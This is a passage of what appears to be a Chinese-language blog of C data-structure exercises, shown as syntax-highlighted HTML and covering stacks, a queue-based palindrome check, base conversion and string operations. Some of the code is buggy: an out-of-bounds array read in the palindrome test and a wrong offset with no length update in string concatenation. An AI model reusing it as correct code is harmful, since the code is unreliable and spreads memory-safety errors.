keyword">sizeof</span><span class="token punctuation">(</span>datatype<span class="token punctuation">)</span><span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>z<span class="token operator">-></span>top<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">full</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span>z<span class="token operator">-></span>top<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">empty</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span>z<span class="token operator">-></span>top<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">push</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>z<span class="token punctuation">,</span>datatype x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">full</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"man"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>z<span class="token operator">-></span>a<span class="token punctuation">[</span><span class="token operator">++</span>z<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pop</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>z<span class="token punctuation">,</span>datatype <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span>x <span class="token operator">=</span> z<span class="token operator">-></span>a<span class="token punctuation">[</span>z<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">slength</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>z<span class="token operator">-></span>top<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">number</span><span class="token punctuation">(</span>que <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">-></span>r <span class="token operator">-</span> s<span class="token operator">-></span>f <span class="token operator">+</span>max<span class="token punctuation">)</span><span class="token operator">%</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>que s<span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>x<span class="token punctuation">,</span>n<span class="token punctuation">;</span>datatype a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">csh</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">rd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>n <span class="token operator">=</span> <span class="token function">number</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*for (int i = 0; i &lt; n; i++)&#123;cd(&amp;s,&amp;x);printf("%2d\n",x );&#125; */</span>stack z<span class="token punctuation">;</span><span class="token function">cshz</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> l<span class="token punctuation">,</span>j<span class="token punctuation">;</span>datatype y<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>z<span class="token punctuation">,</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>l <span class="token operator">=</span> <span class="token function">slength</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> l<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">cd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>z<span class="token punctuation">,</span><span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2d"</span><span class="token punctuation">,</span>x <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2d\n"</span><span class="token punctuation">,</span>y <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是回文\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">max</span> <span class="token expression"><span class="token number">9</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>datatype <span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">int</span> top<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>stack<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">csh</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>a<span class="token operator">=</span><span class="token punctuation">(</span>datatype <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>datatype<span class="token punctuation">)</span><span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token operator">-></span>top<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">full</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span>s<span class="token operator">-></span>top<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">kong</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span>s<span class="token operator">-></span>top<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">push</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>s<span class="token punctuation">,</span>datatype x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">full</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"man"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token operator">-></span>a<span class="token punctuation">[</span><span class="token operator">++</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pop</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>s<span class="token punctuation">,</span>datatype <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kong</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"kong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span>x <span class="token operator">=</span> s<span class="token operator">-></span>a<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">length</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">jz</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>stack l<span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>datatype k<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>i <span class="token operator">=</span> n <span class="token operator">%</span> m<span class="token punctuation">;</span>j <span class="token operator">=</span> n <span class="token operator">/</span> m<span class="token punctuation">;</span>n <span class="token operator">=</span> j<span class="token punctuation">;</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>x <span class="token operator">=</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>x <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>y <span class="token operator">&lt;=</span> x<span class="token punctuation">;</span>y<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c\n"</span><span class="token punctuation">,</span> k<span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">96</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>k <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>stack s<span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>n<span class="token punctuation">;</span>datatype a<span class="token punctuation">,</span>x<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%d\n"</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n <span class="token operator">=</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">jz</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="串"><a href="#串" class="headerlink" title="串"></a>串</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">char</span> datatype<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">max</span> <span class="token expression"><span class="token number">50</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">str</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> ch<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> length<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>string<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">csh</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>s<span class="token operator">-></span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strassign</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">></span> max<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>s<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strlength</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span>s<span class="token operator">-></span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strinput</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> s<span class="token operator">-></span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strinsert</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>string <span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">></span> s<span class="token operator">-></span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"位置错误\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>s<span class="token operator">-></span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token operator">+</span>q<span class="token operator">-></span>length<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>q<span class="token operator">-></span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token operator">-></span>length <span class="token operator">=</span> q<span class="token operator">-></span>length <span class="token operator">+</span> s<span class="token operator">-></span>length<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strca</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">,</span>string <span class="token operator">*</span>t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token operator">-></span>length <span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> t<span class="token operator">-></span>length <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"有字符串为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>t<span class="token operator">-></span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>t<span class="token operator">-></span>length <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strdel</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">,</span>string <span class="token operator">*</span>x<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n <span class="token operator">></span> s<span class="token operator">-></span>length <span class="token operator">||</span> l <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>l <span class="token operator">></span> <span class="token punctuation">(</span>s<span class="token operator">-></span>length <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>l<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token operator">-></span>ch<span class="token punctuation">[</span>n<span class="token operator">+</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">//带回删除的字符串</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>s<span class="token operator">-></span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">//删除字符串</span>s<span class="token operator">-></span>length <span class="token operator">=</span> s<span class="token operator">-></span>length <span class="token operator">-</span> 